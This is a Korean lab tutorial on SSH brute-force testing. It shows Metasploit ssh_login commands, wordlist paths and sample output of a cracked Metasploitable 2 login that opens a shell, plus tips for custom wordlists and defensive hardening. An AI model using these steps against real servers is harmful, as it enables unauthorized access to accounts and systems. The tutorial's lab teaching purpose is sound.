네트워크 취약점 점검 실무
SSH 무차별 대입 공격(Brute Force Attack) 실습

CRITICALITY: 8.5

Infrastructure Security Pro

1. 아키텍처 개요 (Architecture Overview)

무차별 대입 공격(Brute Force Attack, 사용자 이름과 암호의 모든 가능한 조합을 시적으로 대입하여 인증을 뚫는 공격)은 보안이 취약한 SSH(Secure Shell, 원격 접속을 위한 보안 네트워크 프로토콜) 서버를 대상으로 가장 흔히 발생하는 공격 중 하나입니다. 이번 실습에서는 메타스플로잇 프레임워크(Metasploit Framework, 보안 취약점 진단 및 침투 테스트 도구)를 사용하여 대상 시스템의 취약한 계정을 탐색합니다.

[도식: SSH 무차별 대입 공격 메커니즘]

공격자 시스템 (Kali Linux)
Metasploit Auxiliary Module
Dictionary Loading Login Attempts
대상 서버 (Target Host)
TCP Port 22 (SSH)

2. 실습 구성 요소 (Components)

NODE 01

점검 시스템 (Attacker)

  • OS: Kali Linux (칼리 리눅스)
  • Tool: Metasploit Framework (MSF)
  • Wordlist: /usr/share/wordlists (사전 파일)
NODE 02

대상 시스템 (Target)

  • OS: Metasploitable 2 (취약점이 내재된 가상 머신)
  • Port: 22번 (SSH Service)
  • IP: 실습 네트워크 내부 IP

3. 실증 및 구현 (Implementation)

STEP 01

Metasploit Framework 실행

공격자 시스템에서 터미널을 열고 MSF 콘솔을 실행합니다.

Console
$ msfconsole -q
msf6 >
STEP 02

SSH 로그인 스캐너 모듈 선택

SSH 서비스에 대한 무차별 대입을 수행하는 보조 모듈(Auxiliary Module)을 로드합니다.

Console
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) >
STEP 03

공격 옵션 설정 (Target & Wordlists)

대상이 되는 시스템의 IP와 사용할 사전 파일(Wordlists) 경로를 지정합니다.

Console
msf6 auxiliary(...) > set RHOSTS [대상_IP]
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt
msf6 auxiliary(...) > set STOP_ON_SUCCESS true
STEP 04

공격 수행 및 세션 확보

공격을 시작하고 성공 시 자동으로 쉘(Shell) 세션을 생성하도록 합니다.

Console
msf6 auxiliary(...) > run
[+] [IP]:22 - Success: 'msfadmin':'msfadmin'
[*] Command shell session 1 opened...

4. 아키텍트 인사이트 (Expert Insight)

효율적인 사전 공격(Dictionary Attack) 전략

무작위 대입보다는 타겟의 도메인 명칭, 회사 이름 등을 조합한 맞춤형 사전 파일(Customized Wordlist)을 사용하는 것이 성공률이 비약적으로 높습니다. `Crunch`나 `CeWL` 도구를 활용하여 사전을 생성해 보십시오.

보안 강화 (Hardening) 대책

SSH 무차별 대입을 막기 위해 가장 효과적인 방법은 **비밀번호 기반 인증을 비활성화**하고 **공개키(Public Key) 기반 인증**을 사용하는 것입니다. 또한 `Fail2Ban`(로그 분석을 통한 IP 차단 도구)을 설정하여 반복적인 로그인 실패 시 해당 IP를 차단하십시오.

클라우드 환경(AWS/GCP/Azure) 실습 시 주의사항

AWS(Amazon Web Services, 아마존 웹 서비스) 인스턴스에 대해 무단으로 무차별 대입 공격을 수행하는 것은 서비스 이용 약관 위반으로 간주되어 계정이 정지될 수 있습니다. 반드시 **자신이 소유한 VPC(Virtual Private Cloud) 내부**의 테스트용 인스턴스에서만 수행하십시오. 또한, 공격 시 발생하는 과도한 네트워크 트래픽 및 로그 데이터로 인해 **CloudWatch(클라우드워치) 및 GuardDuty(가드듀티)**에서 탐지되어 추가 비용이 발생할 수 있음을 인지하시기 바랍니다.
